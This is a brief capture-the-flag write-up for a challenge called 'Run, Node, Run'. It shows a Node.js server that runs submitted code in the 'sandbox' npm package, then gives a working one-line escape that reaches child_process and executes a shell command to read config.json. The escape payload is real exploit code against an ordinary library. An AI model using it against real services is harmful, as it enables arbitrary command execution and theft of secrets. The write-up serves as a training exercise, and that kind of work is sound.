# Day 10: >_ Run, Node, Run

In this challenge we can run JavaScript in a sandbox environment. The NodeJS server uses the following code:

```javascript
const {flag, port} = require("./config.json");
const sandbox = require("sandbox");
const app = require("express")();

app.use(require('body-parser').urlencoded({ extended: false }));

app.get("/", (req, res) => res.sendFile(__dirname+"/index.html"));
app.get("/code", (req, res) => res.sendFile(__filename));

app.post("/run", (req, res) => {

	if (!req.body.run) {
		res.json({success: false, result: "No code provided"});
		return;
	}

	let boiler = "const flag_" + require("randomstring").generate(64) + "=\"" + flag + "\";\n";

	new sandbox().run(boiler + req.body.run, (out) => res.json({success: true, result: out.result}));

});

app.listen(port);
```

The goal is to read the contents of the `config.json`. We won't be able to find the correct variable name because of the
randomstring part. So we have to break out of this sandbox. We can check the GitHub Issues if there's a way to
accomplish this. And of course [there's a way](https://github.com/gf3/sandbox/issues/50). Now we just have to craft a
malicious input:

```javascript
new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("cat config.json")
```
